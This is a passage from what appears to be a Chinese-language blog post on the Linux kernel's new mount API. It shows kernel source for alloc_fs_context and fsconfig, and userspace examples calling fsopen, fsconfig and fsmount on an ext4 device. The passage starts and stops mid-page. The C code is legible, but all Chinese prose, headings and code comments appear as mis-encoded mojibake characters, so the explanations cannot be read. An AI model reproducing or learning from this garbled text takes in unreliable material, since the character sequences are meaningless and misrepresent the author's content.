class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡.</span><br><span class="hljs-comment"> * @fs_type: æ–‡ä»¶ç³»ç»Ÿç±»å‹.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)//æƒ³ä¸å‡ºå’‹ç¿»</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock æ ‡å¿—ä½ (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: @sb_flags ä¸­å¯ç”¨çš„æˆå‘˜</span><br><span class="hljs-comment"> * @purpose: æœ¬æ¬¡é…ç½®çš„ç›®çš„.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿå¹¶åˆ›å»ºä¸€ä¸ªæŒ‚è½½ä¸Šä¸‹æ–‡ï¼ˆmount contextï¼‰ï¼ŒæŒ‚è½½ä¸Šä¸‹æ–‡è¢«ä»¥å¯¹åº”çš„æ ‡å¿—ä½è¿›è¡Œåˆå§‹åŒ–ï¼Œ</span><br><span class="hljs-comment"> * è‹¥ä»å¦ä¸€ä¸ª superblock ï¼ˆå¼•è‡ª @referenceï¼‰è¿›è¡Œ submount/automountï¼Œ</span><br><span class="hljs-comment"> * åˆ™å¯èƒ½ç”±ä»è¯¥ superblock æ‹·è´æ¥çš„å‚æ•°1ï¼ˆå¦‚å‘½åç©ºé—´ï¼‰.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">      <span class="hljs-keyword">enum</span> fs_context_purpose purpose)</span><br>&#123;<br><span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-type">int</span> ret = -ENOMEM;<br><br><span class="hljs-comment">// åˆ†é… fs_context ç»“æ„ä½“</span><br>fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br><span class="hljs-comment">// è®¾ç½®å¯¹åº”å±æ€§</span><br>fc-&gt;purpose= purpose;<br>fc-&gt;sb_flags= sb_flags;<br>fc-&gt;sb_flags_mask = sb_flags_mask;<br>fc-&gt;fs_type= get_filesystem(fs_type);<br>fc-&gt;cred= get_current_cred();<br>fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);<br><br>mutex_init(&amp;fc-&gt;uapi_mutex);<br><br><span class="hljs-comment">// ç”± purpose è®¾ç½®å¯¹åº”çš„å‘½åç©ºé—´</span><br><span class="hljs-keyword">switch</span> (purpose) &#123;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br><span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>fc-&gt;root = dget(reference);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> è®©æ‰€æœ‰çš„æ–‡ä»¶ç³»ç»Ÿæ— æ¡ä»¶æ”¯æŒè¿™å— */</span><br>init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br><span class="hljs-keyword">if</span> (!init_fs_context)<br>init_fs_context = legacy_init_fs_context;<br><br><span class="hljs-comment">// åˆå§‹åŒ– fs_context</span><br>ret = init_fs_context(fc);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err_fc;<br>fc-&gt;need_free = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>put_fs_context(fc);<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å®Œæˆäº†é€šç”¨çš„åˆå§‹åŒ–å·¥ä½œåï¼Œæœ€ç»ˆè¿›è¡Œå…·ä½“æ–‡ä»¶ç³»ç»Ÿå¯¹åº”åˆå§‹åŒ–å·¥ä½œçš„å…¶å®æ˜¯è°ƒç”¨ <code>file_system_type</code> ä¸­çš„ <code>init_fs_context</code> å‡½æ•°æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°å®Œæˆçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸»è¦å°±æ˜¯ä¸º <code>fs_context-&gt;fs_private</code> åˆ†é…ä¸€ä¸ª <code>legacy_fs_context</code> ç»“æ„ä½“ï¼Œå¹¶å°† <code>fs_context</code> çš„å‡½æ•°è¡¨è®¾ç½®ä¸º <code>legacy_fs_context_ops</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_init_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br>fc-&gt;fs_private = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> legacy_fs_context), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!fc-&gt;fs_private)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>fc-&gt;ops = &amp;legacy_fs_context_ops;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>legacy_fs_context</code> ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼Œæ ‡è¯†äº†ä¸€å—æŒ‡å®šé•¿åº¦ä¸ç±»å‹çš„ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> &#123;</span><br><span class="hljs-type">char</span>*legacy_data;<span class="hljs-comment">/* Data page for legacy filesystems */</span><br><span class="hljs-type">size_t</span>data_size;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">legacy_fs_param</span><span class="hljs-title">param_type</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="Step-II-fsconfig-è®¾ç½®-filesystem-context-çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ"><a href="#Step-II-fsconfig-è®¾ç½®-filesystem-context-çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ" class="headerlink" title="Step.II - fsconfig: è®¾ç½® filesystem context çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ"></a>Step.II - fsconfig: è®¾ç½® filesystem context çš„ç›¸å…³å‚æ•°ä¸æ“ä½œ</h3><p>åœ¨å®Œæˆäº†ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹å…¶è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œä»¥ä¾¿äºåç»­çš„æŒ‚è½½æ“ä½œï¼Œè¿™ä¸ªé…ç½®çš„åŠŸèƒ½å¯¹åº”åˆ°çš„å°±æ˜¯ <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨</p><p> <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œä¸åŒçš„æ“ä½œï¼Œå¯¹äºæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè€Œè¨€å…¶æ ¸å¿ƒæ“ä½œä¸»è¦å°±æ˜¯ä¸¤ä¸ª cmdï¼š</p><ul><li><code>FSCONFIG_SET_STRING</code> ï¼šè®¾ç½®ä¸åŒçš„é”®å€¼å¯¹å‚æ•°</li><li><code>FSCONFIG_CMD_CREATE</code>ï¼šè·å¾—ä¸€ä¸ª superblock å¹¶åˆ›å»ºä¸€ä¸ª root entry</li></ul><p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸‹æ‰€ç¤ºï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªé”®å€¼å¯¹ <code>&quot;source&quot;=/dev/sdb1</code> è¡¨ç¤ºæ–‡ä»¶ç³»ç»Ÿæºæ‰€åœ¨çš„è®¾å¤‡åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="âœ³-fsconfig-in-kernel"><a href="#âœ³-fsconfig-in-kernel" class="headerlink" title="âœ³ fsconfig() in kernel"></a>âœ³ fsconfig() in kernel</h4><p>å†…æ ¸ç©ºé—´ä¸­çš„ <code>fsconfig()</code> å®ç°æ¯”è¾ƒé•¿ï¼Œä½†ä¸»è¦å°±æ˜¯æ ¹æ® cmd è¿›è¡Œå„ç§ switchï¼Œè¿™é‡Œå°±ä¸è´´å®Œæ•´çš„æºç äº†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE5(fsconfig,<br><span class="hljs-type">int</span>, fd,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, cmd,<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, _key,<br><span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *, _value,<br><span class="hljs-type">int</span>, aux)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span>;</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> <span class="hljs-title">param</span> =</span> &#123;<br>.type= fs_value_is_undefined,<br>&#125;;<br><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FLAG:<br><span class="hljs-comment">// ä¸»è¦æ˜¯å‚æ•°çš„å„ç§æ£€æŸ¥</span><br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br>&#125;<br><br><span class="hljs-comment">// è·å–æ–‡ä»¶æè¿°ç¬¦</span><br>f = fdget(fd);<br><span class="hljs-keyword">if</span> (!f.file)<br><span class="hljs-keyword">return</span> -EBADF;<br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (f.file-&gt;f_op != &amp;fscontext_fops)<br><span class="hljs-keyword">goto</span> out_f;<br><br><span class="hljs-comment">// è·å– fs_contextï¼Œå­˜å‚¨åœ¨æ–‡ä»¶æè¿°ç¬¦çš„ private_data å­—æ®µ</span><br>fc = f.file-&gt;private_data;<br><span class="hljs-keyword">if</span> (fc-&gt;ops == &amp;legacy_fs_context_ops) &#123;<br><span class="hljs-keyword">switch</span> (cmd) &#123; <span class="hljs-comment">// ä¸€ä¸ªæ“ä½œéƒ½æ²¡å®ç°</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_BINARY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_PATH_EMPTY:<br><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>ret = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// æ‹·è´ key å­—æ®µåˆ°å†…æ ¸ç©ºé—´</span><br><span class="hljs-keyword">if</span> (_key) &#123;<br>param.key = strndup_user(_key, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.key)) &#123;<br>ret = PTR_ERR(param.key);<br><span class="hljs-keyword">goto</span> out_f;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œ param çš„ä¸åŒè®¾ç½®</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™ä¸ª cmd</span><br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br>param.type = fs_value_is_string;<br>param.<span class="hljs-built_in">string</span> = strndup_user(_value, <span class="hljs-number">256</span>);<br><span class="hljs-keyword">if</span> (IS_ERR(param.<span class="hljs-built_in">string</span>)) &#123;<br>ret = PTR_ERR(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">goto</span> out_key;<br>&#125;<br>param.size = <span class="hljs-built_in">strlen</span>(param.<span class="hljs-built_in">string</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">// ...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// æ ¹æ®å‰é¢è®¾ç½®çš„ param è¿›è¡Œ VFS ç›¸å…³æ“ä½œ</span><br>ret = vfs_fsconfig_locked(fc, cmd, &amp;param);<br>mutex_unlock(&amp;fc-&gt;uapi_mutex);<br>&#125;<br><br><span class="hljs-comment">/* Clean up the our record of any value that we obtained from</span><br><span class="hljs-comment"> * userspace.  Note that the value may have been stolen by the LSM or</span><br><span class="hljs-comment"> * filesystem, in which case the value pointer will have been cleared.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> FSCONFIG_SET_STRING:<br><span class="hljs-comment">// ä¸´æ—¶æ•°æ®æ¸…ç†å·¥ä½œ</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>out_key:<br>kfree(param.key);<br>out_f:<br>fdput(f);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>fsconfig()</code> çš„æ ¸å¿ƒä½œç”¨ä¸»è¦è¿˜æ˜¯æ ¹æ® cmd è¿›è¡Œå‚æ•°çš„å°è£…ï¼Œæœ€åè¿›å…¥åˆ° VFS ä¸­çš„æ“ä½œåˆ™é€šè¿‡ <code>vfs_fsconfig_locked()</code> å®Œæˆ</p><h3 id="Step-III-fsmount-è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹"><a href="#Step-III-fsmount-è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹" class="headerlink" title="Step.III - fsmount: è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹"></a>Step.III - fsmount: è·å–ä¸€ä¸ªæŒ‚è½½å®ä¾‹</h3><p>å®Œæˆäº†æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¸é…ç½®ï¼Œæ¥ä¸‹æ¥ç»ˆäºæ¥åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½æ“ä½œäº†ï¼Œ<code>fsmount()</code> ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥è·å–ä¸€ä¸ªå¯ä»¥è¢«ç”¨ä»¥è¿›è¡ŒæŒ‚è½½çš„æŒ‚è½½å®ä¾‹ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ç”¨ä»¥ä¸‹ä¸€æ­¥çš„æŒ‚è½½</p><p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsmount</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsmount 432</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd, mount_fd;<br>    <br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] FAILED to fsopen!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);<br><br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-number">0</span>);<br>    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><br>    mount_fd = fsmount(fs_fd, FSMOUNT_CLOEXEC, MOUNT_ATTR_RELATIME);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-IV-move-mount-å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨"><a href="#Step-IV-move-mount-å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨" class="headerlink" title="Step.IV - move_mount: å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨"></a>Step.IV - move_mount: å°†æŒ‚è½½å®ä¾‹åœ¨æŒ‚è½½ç‚¹é—´ç§»åŠ¨</h3><p>æœ€åæ¥åˆ°<del>ä¸€ä¸ªä¸ç»Ÿä¸€ä»¥ fs å¼€å¤´è¿›è¡Œå‘½åçš„</del> 